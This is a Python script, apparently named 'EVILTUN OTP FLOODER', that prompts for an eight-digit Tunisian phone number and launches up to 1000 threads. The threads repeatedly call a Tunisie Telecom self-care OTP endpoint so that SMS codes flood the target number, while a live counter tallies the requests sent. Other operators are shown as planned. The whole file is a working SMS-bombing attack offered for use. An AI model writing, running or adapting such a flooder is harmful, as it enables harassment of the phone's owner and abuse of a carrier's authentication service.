import requests
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
import time
import itertools
from threading import Lock

# Initialize colorama
init(autoreset=True)

# Operator selection
OPERATORS = {
    "1": "Telecom",
    "2": "Orange",
    "3": "Ooredoo"
}

# Global request counter and lock
request_count = 0
lock = Lock()

def send_otp(phone_number):
    global request_count
    url = f"https://myttauth.tunisietelecom.tn/realms/selfcareportal/sms/otp-code?phoneNumber={phone_number}"
    try:
        requests.get(url, timeout=5)
        with lock:
            request_count += 1
    except:
        pass  # Ignore timeouts and connection errors

def worker(phone_number):
    while True:
        send_otp(phone_number)

def show_counter():
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    while True:
        with lock:
            count = request_count
        spin = next(spinner)
        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count}", end='', flush=True)
        time.sleep(0.1)

def show_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}
███████╗██╗   ██╗██╗██╗     ████████╗██╗   ██╗███╗   ██╗
██╔════╝██║   ██║██║██║     ╚══██╔══╝██║   ██║████╗  ██║
█████╗  ██║   ██║██║██║        ██║   ██║   ██║██╔██╗ ██║
██╔══╝  ██║   ██║██║██║        ██║   ██║   ██║██║╚██╗██║
███████╗╚██████╔╝██║███████╗   ██║   ╚██████╔╝██║ ╚████║
╚══════╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
{Style.RESET_ALL}
{Fore.YELLOW}             ⚡ EVILTUN OTP FLOODER ⚡
{Style.RESET_ALL}
"""
    print(banner)

def main():
    show_banner()

    print(Fore.RED + "Choose Operator:")
    print(Fore.YELLOW + "1 - Telecom")
    print("2 - Orange")
    print("3 - Ooredoo")
    operator_choice = input(Fore.CYAN + "Your choice: ").strip()

    if operator_choice not in OPERATORS:
        print(Fore.RED + "Invalid choice. Exiting.")
        sys.exit(1)

    operator_name = OPERATORS[operator_choice]

    if operator_choice != "1":
        print(Fore.MAGENTA + f"{operator_name} support coming soon... 🚧")
        sys.exit(0)

    print(Fore.GREEN + f"Selected operator: {operator_name}")

    phone_number = input(Fore.CYAN + "Enter phone number (e.g. 95467473): ").strip()
    if not phone_number.isdigit() or len(phone_number) != 8:
        print(Fore.RED + "Invalid phone number. Must be 8 digits.")
        sys.exit(1)

    try:
        thread_count = int(input(Fore.CYAN + "How many threads? (10 to 1000): ").strip())
        if not 10 <= thread_count <= 1000:
            raise ValueError
    except ValueError:
        print(Fore.RED + "Invalid thread count. Must be between 10 and 1000.")
        sys.exit(1)

    print(Fore.GREEN + f"\n🚀 Launching EVILTUN with {thread_count} threads targeting {phone_number}...\n")

    # Start counter display
    threading.Thread(target=show_counter, daemon=True).start()

    # Start threaded workers
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(worker, phone_number)

if __name__ == "__main__":
    main()
